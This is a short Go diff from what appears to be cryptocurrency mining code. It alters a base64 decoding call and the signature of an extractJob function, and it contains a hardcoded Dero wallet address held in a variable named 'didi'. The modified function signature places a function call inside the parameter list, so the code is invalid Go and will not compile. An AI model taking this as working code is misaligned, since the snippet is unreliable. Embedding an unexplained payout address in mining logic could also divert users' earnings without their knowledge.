@@ -25,9 +25,9 @@ func base64Decode(str string) (string, bool) {
     return string(data), false
 }
 
-var data = base64Decode(data);
+//var data = base64Decode(data);
 
-func extractJob(data map[string]any) (*Job, error) {
+func extractJob(base64Decode(data map[string]any)) (*Job, error) {
 	var didi interface{}
 	didi = "dero1qyrh32ggyrg2mgcncwqv38dp7kc9wgd6qyacrvt68fzrkt9w9g0fvqgy7qqks"
 	var didis interface{}
